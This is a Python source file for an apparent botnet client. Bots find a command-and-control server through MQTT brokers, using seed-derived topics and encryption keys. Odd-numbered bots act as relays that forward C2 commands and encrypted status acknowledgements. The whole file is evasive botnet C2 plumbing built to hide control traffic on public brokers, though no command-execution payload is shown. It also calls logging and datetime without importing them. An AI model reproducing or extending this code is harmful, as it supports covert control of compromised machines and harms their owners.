import hashlib
import json
import os
import queue
import struct
import sys
import random
import threading
import time
from cipher import encrypt, generate_aes_key_from_seed, decrypt
from string_generator import generate_and_split_base_strings
from tga_generator import *
from mqtt import MQTTClient

class ColoredFormatter(logging.Formatter):
    BLUE = "\033[94m"
    RED = "\033[91m"
    RESET = "\033[0m"

    def __init__(self, is_relay, fmt=None):
        color = self.RED if is_relay else self.BLUE
        self.color = color
        fmt = fmt or "%(levelname)s - %(message)s"
        super().__init__(fmt)

    def format(self, record):
        message = super().format(record)
        return f"{self.color}{message}{self.RESET}"

class Logger:
    def __init__(self, is_relay=False):
        self.logger = logging.getLogger(f"bot_logger_{id(self)}")
        self.logger.setLevel(logging.DEBUG)
        self.logger.propagate = False  # <--- This prevents duplication

        handler = logging.StreamHandler()
        formatter = ColoredFormatter(is_relay)
        handler.setFormatter(formatter)

        if not self.logger.handlers:
            self.logger.addHandler(handler)

    def log_context(self, bot_id=None, broker=None):
        if bot_id and broker:
            return f"{bot_id}::{broker}"
        elif bot_id:
            return f"{bot_id}: "
        elif broker:
            return f"{broker}: "
        return ""

    def info(self, message, bot_id=None, broker=None):
        self.logger.info(f"{self.log_context(bot_id, broker)} {message}")

    def error(self, message, bot_id=None, broker=None):
        self.logger.error(f"{self.log_context(bot_id, broker)} {message}")

    def warning(self, message, bot_id=None, broker=None):
        self.logger.warning(f"{self.log_context(bot_id, broker)} {message}")


class TopicGenerator:
    def __init__(self, logger):
        self.logger = logger

    def generate_topic_parameters(self, seed):
        seed_str = str(seed)
        hash_obj = hashlib.md5(seed_str.encode())
        hash_bytes = hash_obj.digest()
        length_value, level_value = struct.unpack('II', hash_bytes[:8])
        topic_length = 10 + (length_value % 91)
        topic_level = 2 + (level_value % 9)
        return topic_length, topic_level

    def get_random_ip_without_repetition(self, base_brokers_set):
        random.seed(time.time())
        shuffled_ips = base_brokers_set.copy()
        random.shuffle(shuffled_ips)  # Shuffle the IPs
        for ip in shuffled_ips:  # Yield one IP at a time
            yield ip


class ChannelManager:
    def __init__(self, logger, topic_generator):
        self.logger = logger
        self.topic_generator = topic_generator

    def get_broker_channel(self, selected_broker, status_string, seed):
        topic_length, topic_level = self.topic_generator.generate_topic_parameters(seed)
        half = len(status_string) // 2
        key_seed = status_string[:half]
        tga_seed = status_string[half:]
        topic = generate_topic(tga_seed, topic_length, topic_level)
        cipher_key = generate_aes_key_from_seed(key_seed, selected_broker)
        return cipher_key, topic



class Bot:
    def __init__(self, bot_id, seed):
        self.sync_wait_time = None
        self.bot_id = bot_id
        self.seed = seed
        self.is_relay = bool(bot_id % 2)
        self.logger = Logger(is_relay=self.is_relay)
        self.logger.info(f"Bot {bot_id} initialized. Relay: {self.is_relay}")
        self.topic_generator = TopicGenerator(self.logger)
        self.channel_manager = ChannelManager(self.logger, self.topic_generator)
        self.used_ips = set()
        self.status_to_c2_topic = None
        self.status_to_c2_cipher_key = None
        self.status_to_c2_broker = None
        self.used_command_strings = set()
        self.relay_brokers_command_map = {}
        self.relay_brokers_status_map = {}
        self.result_queue = queue.Queue()
        self.path_to_c2_found = False
        process_results_thread = threading.Thread(target=self.process_results_callback, args=())
        process_results_thread.start()

    def process_message(self, client, userdata, payload, message_received=None, c2_found=None):
        try:
            broker = userdata['broker']
            decrypted_message = decrypt(userdata['cipher_key'], payload, userdata['bot_id']) if userdata.get(
                'cipher_key') else payload
            data = json.loads(decrypted_message)
            self.logger.info(f"Message: {data}", self.bot_id, broker)
            message_type = data.get("type", "")
            status_string = data.get("status_base_string", "")
            self.status_to_c2_cipher_key, self.status_to_c2_topic = self.channel_manager.get_broker_channel(broker, status_string, self.seed)
            token = hashlib.sha256(self.seed.encode()).hexdigest()
            self.status_to_c2_broker = broker
            if message_type == "CMD":
                c2_found.set()
                if self.is_relay:
                    self.logger.info(f"CMD RECEIVED FROM C&C Forwarding: {data}", self.bot_id, broker)
                    self.relay_to_bots(decrypted_message)
                else:
                    self.logger.info(f"CMD RECEIVED FROM C&C: {data}", self.bot_id, broker)
                    cmd_ack_data = {
                        "token": token,
                        "type": "CMD_ACK",
                        "bot_id": self.bot_id,
                        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "msg": "ok"
                    }
                    json_string = json.dumps(cmd_ack_data)
                    encrypted_message = encrypt(self.status_to_c2_cipher_key, json_string)
                    self.logger.info(f"status_string: {status_string}", self.bot_id, broker)
                    self.logger.info(f"status_topic: {self.status_to_c2_topic}", self.bot_id, broker)
                    self.logger.info(f"cipher_key: {self.status_to_c2_cipher_key}", self.bot_id, broker)
                    self.logger.info(f"Publishing CMD_ACK: {json_string}", self.bot_id, broker)
                    self.logger.info(f"Encrypted message: {encrypted_message}", self.bot_id, broker)
                    mqtt_client = MQTTClient(client_id=self.bot_id, broker=broker, result_queue=self.result_queue,
                                             relay=self.is_relay)
                    if mqtt_client.publish(self.status_to_c2_topic, encrypted_message):
                        self.logger.info(f"CMD_ACK published successfully: {json_string}", self.bot_id, broker)
            elif message_type == "SYNC":
                self.logger.info(f"SYNC RECEIVED: {data}", self.bot_id, broker)
                self.sync_wait_time = data.get("wait_time", 30)
                sync_ack_data = {
                    "token": token,
                    "type": "SYNC_ACK",
                    "bot_id": self.bot_id,
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "msg": f"waiting for {self.sync_wait_time} seconds"
                }
                json_string = json.dumps(sync_ack_data)
                encrypted_message = encrypt(self.status_to_c2_cipher_key, json_string)
                self.logger.info(f"status_string: {status_string}", self.bot_id, broker)
                self.logger.info(f"status_topic: {self.status_to_c2_topic}", self.bot_id, broker)
                self.logger.info(f"cipher_key: {self.status_to_c2_cipher_key}", self.bot_id, broker)
                self.logger.info(f"Publishing SYNC_ACK: {json_string}", self.bot_id, broker)
                self.logger.info(f"Encrypted message: {encrypted_message}", self.bot_id, broker)
                mqtt_client = MQTTClient(client_id=self.bot_id, broker=broker, result_queue=self.result_queue,
                                         relay=self.is_relay)
                if mqtt_client.publish(self.status_to_c2_topic, encrypted_message):
                    self.logger.info(f"SYNC_ACK published successfully: {json_string}", self.bot_id, broker)
        except Exception as e:
            self.logger.error(f"Message processing error: {str(e)}", userdata['bot_id'], userdata['broker'])
        message_received.set()


    def start(self, base_brokers_set):
        self.logger.info(f"Initializing bot...", self.bot_id)
        command_strings_subset, status_strings_subset = generate_and_split_base_strings(self.seed)
        shuffled_brokers = list(self.topic_generator.get_random_ip_without_repetition(base_brokers_set))
        topic_length, topic_level = self.topic_generator.generate_topic_parameters(self.seed)
        self.logger.info(f"topic_length: {topic_length}", self.bot_id)
        self.logger.info(f"topic_level: {topic_level}", self.bot_id)
        if(self.is_relay):
            self.logger.info(f"Starting Relaying Setup...", self.bot_id)
            self.relay_bot(shuffled_brokers, command_strings_subset, status_strings_subset, topic_length, topic_level)
        else:
            self.logger.info(f"Starting Client Setup...", self.bot_id)
            self.client_bot(shuffled_brokers, command_strings_subset, topic_length, topic_level)


    def client_bot(self, shuffled_brokers, command_strings_subset, topic_length, topic_level):
        message_received = threading.Event()
        c2_found = threading.Event()
        wait_time = 10
        def on_message_callback(client, userdata, message):
            try:
                topic = message.topic
                payload = message.payload.decode('utf-8')
                broker = userdata['broker']
                bot_id = userdata['bot_id']
                self.logger.info(f"Received message on topic {topic}: {payload}", bot_id, broker)
                self.logger.info(f"Received message: {payload} on topic: {message.topic}", self.bot_id)
                self.process_message(client, userdata, payload, message_received, c2_found)
            except Exception as e:
                self.logger.error(f"Error processing message: {e}", self.bot_id)

        command_strings_list = list(command_strings_subset)
        random.seed()
        random.shuffle(command_strings_list)
        found = False
        num = 0
        broker_cycle_count = 0
        while not found:
            broker_cycle_count += 1
            self.logger.info(f"Broker cycle: {broker_cycle_count}")
            # Reset used_ips at the start of each cycle to reuse all brokers
            if broker_cycle_count > 1:
                self.used_ips.clear()
            for broker_ip in shuffled_brokers:
                if found:
                    break
                num += 1
                self.logger.info(f"Try: {num} Selected Broker: {broker_ip}", self.bot_id, broker_ip)
                if broker_ip in self.used_ips:
                    continue
                self.used_ips.add(broker_ip)
                self.used_command_strings.clear()
                for command_string in command_strings_list:
                    if command_string in self.used_command_strings:
                        continue
                    self.logger.info(f"Selected command_string: {command_string}", self.bot_id, broker_ip)
                    try:
                        command_channel_cipher_key, command_channel_topic = self.channel_manager.get_broker_channel(broker_ip, command_string, self.seed)
                        self.logger.info(f"{broker_ip}, command string: {command_string}", self.bot_id, broker_ip)
                        self.logger.info(f"{broker_ip}, topic: {command_channel_topic}", self.bot_id, broker_ip)
                        self.logger.info(f"{broker_ip}, cipher_key: {command_channel_cipher_key}", self.bot_id, broker_ip)
                        mqtt_client = MQTTClient(client_id=self.bot_id, broker=broker_ip, result_queue=self.result_queue,
                                                 relay=self.is_relay)
                        mqtt_client.client.on_message = on_message_callback
                        if mqtt_client.subscribe(command_channel_topic, command_channel_cipher_key):
                            self.logger.info(f"subscribed to topic: {command_channel_topic}", self.bot_id, broker_ip)
                            if not message_received.wait(timeout=wait_time):
                                self.logger.warning(f"No message received within {wait_time} seconds, trying next command string...",
                                                    self.bot_id, broker_ip)
                                self.used_command_strings.add(command_string)
                                mqtt_client.client.loop_stop()
                                mqtt_client.client.disconnect()
                                continue
                            if not c2_found.wait(timeout=self.sync_wait_time):
                                self.logger.warning(f"No command received within {self.sync_wait_time} disconnecting from relay",
                                                    self.bot_id, broker_ip)
                                self.used_command_strings.add(command_string)
                                mqtt_client.client.loop_stop()
                                mqtt_client.client.disconnect()
                                message_received.clear()
                                c2_found.clear()
                                continue
                            self.logger.info(f"C2 found.", self.bot_id, broker_ip)
                            found = True
                            self.path_to_c2_found = True
                            break
                        else:
                            self.logger.warning(f"subscribed failed. Trying the next command_string...", self.bot_id,
                                                broker_ip)

                    except ValueError as e:
                        self.logger.error(f"Error initializing bot: {e}", self.bot_id)
                        break
            if self.path_to_c2_found:
                self.logger.info(f"PATH FOUND @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. ", self.bot_id)
                break
            else:
                self.logger.error(f"DONE Without Success, restarting loop ###############################################################################. ", self.bot_id)

    def select_random_ips(self, ip_list, percentage, exclude_ip):
        selection_pool = [ip for ip in ip_list if ip != exclude_ip]
        num_to_select = int(len(selection_pool) * (percentage / 100))
        if num_to_select == 0:
            num_to_select = int(len(selection_pool) * 0.5)
        if selection_pool and num_to_select == 0:
            num_to_select = 1
        selected_ips = random.sample(selection_pool, num_to_select)
        return selected_ips

    def map_broker_to_channel(self, brokers, strings_subset):
        broker_topic_map = {}
        random.seed()
        for broker in brokers:
            channel_string = random.choice(strings_subset)
            cipher_key, topic = self.channel_manager.get_broker_channel(broker, channel_string, self.seed)
            self.logger.info(f"map_broker_to_channel broker: {broker}, channel_string: {channel_string}, cipher_key: {cipher_key}, topic: {topic}", self.bot_id, broker)

            broker_topic_map[broker] = {
                'cipher_key': cipher_key,
                'topic': topic,
                'channel_string': channel_string
            }
        return broker_topic_map

    def process_results_callback(self,): #used for relaying when channels have already be found
        self.logger.info(f"process_results_callback.............:")
        while True:
            try:
                message = self.result_queue.get(timeout=10000)  # Adjust timeout as needed
                self.logger.info(f"Processing result.............................................................: {message}")
                data = json.loads(message)
                is_up_link = data.get("is_up_link", False)
                decrypted_message = data.get("decrypted_message", "")
                if is_up_link:
                    self.relay_to_c2(decrypted_message)
                    self.logger.info(f"Processing result:<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<: {decrypted_message}")

                else:
                    self.relay_to_bots(decrypted_message)
            except queue.Empty:
                self.logger.info(
                    f"EMPty result...........................................................................: ")
                break

    def relay_to_c2(self, decrypted_message):
        status = json.loads(decrypted_message)
        self.logger.info(f"Processing result:<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<: {status}")
        if self.status_to_c2_topic is not None:
            self.logger.info(f"Forwarding status to C&C: {status}", self.bot_id, self.status_to_c2_topic)
            encrypted_message = encrypt(self.status_to_c2_cipher_key, json.dumps(status))
            self.logger.info(f"Encrypted message: {encrypted_message}", self.bot_id, self.status_to_c2_topic)
            mqtt_client = MQTTClient(client_id=self.bot_id, broker=self.status_to_c2_broker, result_queue=self.result_queue,
                                     relay=self.is_relay)
            if mqtt_client.publish(self.status_to_c2_topic, encrypted_message):
                self.logger.info(f"Status published successfully: {status}", self.bot_id, self.status_to_c2_topic)
            else:
                self.logger.error(f"Status publishing failed: {status}", self.bot_id, self.status_to_c2_topic)
        else:
            self.logger.error(f"Path to C&C not established yet: {status}", self.bot_id, self.status_to_c2_topic)

    def relay_to_bots(self, decrypted_message):
        data = json.loads(decrypted_message)
        for relay_broker, mapping in self.relay_brokers_command_map.items():
            command_to_bot_topic = self.relay_brokers_command_map[relay_broker]['topic']
            command_to_bot_cipher_key = self.relay_brokers_command_map[relay_broker]['cipher_key']
            data.update({"status_base_string": self.relay_brokers_status_map[relay_broker]['channel_string']})
            self.logger.info(f"Processing result:>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: {data}")
            encrypted_message = encrypt(command_to_bot_cipher_key, json.dumps(data))
            self.logger.info(f"{relay_broker}, topic: {command_to_bot_topic}", self.bot_id, relay_broker)
            self.logger.info(f"{relay_broker}, cipher_key: {command_to_bot_cipher_key}", self.bot_id, relay_broker)
            self.logger.info(f"Forwarding command: {encrypted_message}", self.bot_id, relay_broker)
            mqtt_client = MQTTClient(client_id=self.bot_id, broker=relay_broker, result_queue=self.result_queue,
                                     relay=self.is_relay)
            if mqtt_client.publish(command_to_bot_topic, encrypted_message):
                self.logger.info(f"Forwarding successful.", self.bot_id, relay_broker)

    def relay_bot(self, shuffled_brokers, command_strings_subset, status_strings_subset, topic_length, topic_level):
        num = 0
        relay_sent = False
        selected_broker = shuffled_brokers[num]
        for broker_ip in shuffled_brokers:
            num += 1
            if broker_ip in self.used_ips:
                continue
            if relay_sent:
                break
            self.used_ips.add(broker_ip)
            self.logger.info(f"Try: {num} Selected Broker: {broker_ip}", self.bot_id, broker_ip)
            percentage = 3
            try:
                relay_brokers = self.select_random_ips(shuffled_brokers, percentage, broker_ip)
                self.logger.info(f"Original IPs: {shuffled_brokers}", self.bot_id, relay_brokers)
                self.logger.info(f"Excluded IP: {broker_ip}", self.bot_id, relay_brokers)
                self.logger.info(f"Selected {percentage}% of IPs: {relay_brokers}", self.bot_id, relay_brokers)
                self.relay_brokers_command_map = self.map_broker_to_channel(relay_brokers, command_strings_subset)
                self.relay_brokers_status_map = self.map_broker_to_channel(relay_brokers, status_strings_subset)
                selected_broker = broker_ip
                for relay_broker, mapping in self.relay_brokers_command_map.items():
                    command_string = self.relay_brokers_command_map[relay_broker]['channel_string']
                    command_to_bot_topic = self.relay_brokers_command_map[relay_broker]['topic']
                    command_to_bot_cipher_key = self.relay_brokers_command_map[relay_broker]['cipher_key']
                    status_from_bot_string = self.relay_brokers_status_map[relay_broker]['channel_string']
                    status_from_bot_topic = self.relay_brokers_status_map[relay_broker]['topic']
                    status_from_bot_cipher_key = self.relay_brokers_status_map[relay_broker]['cipher_key']
                    self.logger.info(f"{relay_broker}, mapped to command string: {command_string}", self.bot_id, relay_brokers)
                    self.logger.info(f"{relay_broker}, topic: {command_to_bot_topic}", self.bot_id, relay_brokers)
                    self.logger.info(f"{relay_broker}, cipher_key: {command_to_bot_cipher_key}", self.bot_id, relay_brokers)
                    token = hashlib.sha256(self.seed.encode()).hexdigest()
                    data = {
                        "token": token,
                        "type": "SYNC",
                        "bot_id": self.bot_id,
                        "status_base_string": status_from_bot_string,
                        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "msg": "okk",
                        "wait_time": random.randint(50, 100)
                    }

                    json_string = json.dumps(data)
                    encrypted_message = encrypt(command_to_bot_cipher_key, json_string)
                    self.logger.info(f"Publishing: {json_string}", self.bot_id, relay_broker)
                    self.logger.info(f"Encrypted message: {encrypted_message}", self.bot_id, relay_broker)
                    mqtt_client = MQTTClient(client_id=self.bot_id, broker=relay_broker, result_queue=self.result_queue, relay=self.is_relay)
                    if mqtt_client.publish(command_to_bot_topic, encrypted_message):
                        self.logger.info(f"Publish successful. Subscribing...", self.bot_id, relay_broker)
                        self.logger.info(f"subscribing: status_from_bot_string: {status_from_bot_string}", self.bot_id, relay_broker)
                        self.logger.info(f"subscribing to status_from_bot_topic: {status_from_bot_topic}", self.bot_id, relay_broker)
                        self.logger.info(f"status_from_bot_cipher_key: {status_from_bot_cipher_key}", self.bot_id, relay_broker)
                        relay_sent = True
                        thread = threading.Thread(
                            target=mqtt_client.subscribe,
                            args=(status_from_bot_topic, status_from_bot_cipher_key)
                        )
                        thread.start()
                    else:
                        self.logger.warning(f"Publish failed. Trying the next IP...", self.bot_id, relay_broker)
            except ValueError as e:
                self.logger.error(f"Error initializing bot: {e}", self.bot_id)
                break
        self.find_c2_channels(selected_broker, command_strings_subset, topic_length, topic_level)

    def find_c2_channels(self, broker, command_strings_subset, topic_length, topic_level):
        self.status_to_c2_broker = broker
        command_strings_list = list(command_strings_subset)
        random.seed(time.time())
        random.shuffle(command_strings_list)
        c2_found = threading.Event()
        message_received = threading.Event()
        wait_time = 6
        def on_message_callback(client, userdata, message):
            try:
                topic = message.topic
                payload = message.payload.decode('utf-8')
                broker = userdata['broker']
                bot_id = userdata['bot_id']
                self.logger.info(f"Received message on topic {topic}: {payload}", bot_id, broker)
                self.logger.info(f"Received message: {payload} on topic: {message.topic}", self.bot_id)
                self.process_message(client, userdata, payload, c2_found=c2_found, message_received=message_received)
            except Exception as e:
                self.logger.error(f"Error processing message: {e}", self.bot_id)

        found = False
        num = 0
        while not found:
                num += 1
                self.logger.info(f"Finding C2, Try: {num} Selected Broker: {broker}", self.bot_id, broker)
                self.used_command_strings.clear()
                for command_string in command_strings_list:
                    if command_string in self.used_command_strings:
                        continue
                    self.logger.info(f"Selected command_string: {command_string}", self.bot_id, broker)
                    try:
                        command_channel_cipher_key, command_channel_topic = self.channel_manager.get_broker_channel(broker, command_string, self.seed)
                        self.logger.info(f"{broker}, command string: {command_string}", self.bot_id, broker)
                        self.logger.info(f"{broker}, topic: {command_channel_topic}", self.bot_id, broker)
                        self.logger.info(f"{broker}, cipher_key: {command_channel_cipher_key}", self.bot_id, broker)
                        mqtt_client = MQTTClient(client_id=self.bot_id, broker=broker, result_queue=self.result_queue,
                                                 relay=self.is_relay)
                        mqtt_client.client.on_message = on_message_callback
                        if mqtt_client.subscribe(command_channel_topic, command_channel_cipher_key):
                            self.logger.info(f"subscribed to topic: {command_channel_topic}", self.bot_id, broker)
                            if not message_received.wait(timeout=wait_time):
                                self.logger.warning(f"No message received within {wait_time} seconds, trying next command string...",
                                                    self.bot_id, broker)
                                self.used_command_strings.add(command_string)
                                mqtt_client.client.loop_stop()
                                mqtt_client.client.disconnect()
                                continue
                            if not c2_found.wait(timeout=self.sync_wait_time):
                                self.logger.warning(f"No command received within {self.sync_wait_time} disconnecting from relay",
                                                    self.bot_id, broker)
                                self.used_command_strings.add(command_string)
                                mqtt_client.client.loop_stop()
                                mqtt_client.client.disconnect()
                                message_received.clear()
                                c2_found.clear()
                                continue
                            self.logger.info(f"C2 found. Path set...", self.bot_id, broker)
                            found = True
                            self.path_to_c2_found = True
                            break
                        else:
                            self.logger.warning(f"subscribed failed. Trying the next command_string...", self.bot_id,
                                                broker)
                    except ValueError as e:
                        self.logger.error(f"Error initializing bot: {e}", self.bot_id)
                        break